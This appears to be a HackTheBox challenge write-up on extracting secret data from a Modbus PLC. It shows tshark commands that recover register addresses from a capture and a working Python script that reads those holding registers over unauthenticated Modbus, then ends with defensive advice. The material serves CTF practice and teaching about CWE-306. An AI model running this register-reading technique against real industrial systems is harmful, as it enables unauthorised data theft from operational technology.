---
title: "Intrusion"
date: 2027-09-03 09:00:00 -0500
categories: [HackTheBox, Challenges, ICS]
tags: [hackthebox, challenge, ics, modbus, scada, ot, pcap, tshark, missing-authentication, cwe-306]
description: "An exfil challenge against a Modbus PLC. A one-directional capture leaks which holding registers hold the secret — but not their values. Because Modbus has no authentication, you just read those registers straight back off the live server. The only real trap is the slave id."
---

## Overview

`Intrusion` is an Easy HackTheBox **ICS** (Industrial Control Systems) challenge. You're handed a Modbus/TCP packet capture plus a `client.py` template and told to *"identify the specific registers containing highly sensitive information and extract that data."* The capture tells you **where** the data lives; the extraction happens against a live Modbus server. The whole challenge rests on Modbus having no authentication ([missing authentication for a critical function](https://cwe.mitre.org/data/definitions/306.html), [CWE-306](https://cwe.mitre.org/data/definitions/306.html)) — anyone who can reach the bus can read its registers.

## The technique

Modbus/TCP frames are a 7-byte MBAP header `[transaction][protocol][length][unit]` followed by a PDU `[function_code][data]`. The function codes that show up here:

| FC | Meaning |
|----|---------|
| 0x01 (1) | Read Coils |
| 0x03 (3) | **Read Holding Registers** |
| 0x0F (15) | Write Multiple Coils |
| 0x10 (16) | Write Multiple Registers |

The key insight is that the capture is **one-directional — it contains only the server's responses** — and a Modbus *write response* echoes only the starting address and quantity, never the data that was written. So the FC16 (Write Multiple Registers) responses reveal **which** holding registers were written, but not their contents. To get the values you read those same registers back from the live PLC with FC03.

## Solution

First, triage the capture and confirm the direction of the traffic:

```bash
tshark -r network_logs.pcapng -q -z io,phs                     # 168 frames, all modbus
tshark -r network_logs.pcapng -e modbus.func_code -T fields | sort | uniq -c
#   42  1    (read coils)
#   42  16   (write multiple registers)
#   84  15   (write coils)
tshark -r network_logs.pcapng -e ip.src -T fields | sort -u    # only the server's IP
```

Every frame comes from one host, so these are all responses. Decoding one FC16 frame by hand confirms it — `… 34 10 0006 0001` is `unit 0x34 / func 0x10 / addr 6 / qty 1` with no trailing data, which is the *response* shape.

Now pull the register addresses the operator wrote to:

```bash
tshark -r network_logs.pcapng -Y "modbus.func_code==16" -T fields -e modbus.reference_num
# 6 10 12 21 22 26 47 53 63 77 83 86 89 95 96 104 123 128 131 134 139 143 144 145
# 153 163 168 173 179 193 206 210 214 215 219 221 224 225 226 231 239 253
```

The one trap that will silently waste your time: the Modbus **unit/slave id** is part of addressing, and every captured frame uses `0x34` = **52**. If you read with the library default `slave_id=1`, the server answers with plausible-looking but completely wrong values and no error. Read the id straight off the capture before you start:

```bash
tshark -r network_logs.pcapng -T fields -e mbtcp.unit_id | sort -u   # -> 52
```

Then spawn the instance and read each register back, turning every 16-bit value into one ASCII character.

Create `solve.py`:

```python
#!/usr/bin/env python3
import socket, sys
from umodbus import conf
from umodbus.client import tcp

HOST, PORT = sys.argv[1], int(sys.argv[2])
conf.SIGNED_VALUES = True
UNIT = 0x34                       # 52 — read from the pcap; default 1 returns junk

ADDRS = [6,10,12,21,22,26,47,53,63,77,83,86,89,95,96,104,123,128,131,134,139,143,
         144,145,153,163,168,173,179,193,206,210,214,215,219,221,224,225,226,231,239,253]

s = socket.socket(); s.settimeout(8); s.connect((HOST, PORT))
flag = ""
for a in ADDRS:
    val = tcp.send_message(tcp.read_holding_registers(UNIT, a, 1), s)[0]   # FC03
    flag += chr(val & 0xff)
s.close()
print(flag)
```

`umodbus` isn't installed on Kali by default, so run it from a virtualenv:

```bash
python3 -m venv venv && ./venv/bin/pip install umodbus
./venv/bin/python solve.py <docker_ip> <docker_port>
# HTB{...}
```

Note the script keeps **one** socket open for all 42 reads — that's deliberate. The PLC drops rapid new connections, so a fresh `connect()` per register times out after the first one. One persistent connection carrying all the FC03 transactions is what makes it work. Also remember the docker instance's IP and port rotate between spawns, so pull a fresh target from the challenge info before connecting.

## Why it worked

Modbus has no authentication, no session, and no integrity. The operator stored sensitive data in holding registers, and the only thing protecting it was *which* registers held it — and even that leaked, because the write responses in a passively captured pcap echo their addresses. Once you know the addresses, FC03 Read-Holding-Registers is a single unauthenticated request per register.

## Fix / defense

- Never expose a Modbus endpoint to a user-reachable network — segment it onto an isolated OT VLAN behind an authenticating gateway or VPN.
- Deploy an ICS firewall / Modbus deep-packet-inspection layer that whitelists allowed function codes and register ranges, denying FC03 on sensitive blocks from untrusted clients.
- Don't treat process-data registers as a place to keep secrets — there is no confidentiality on the wire or at the register.
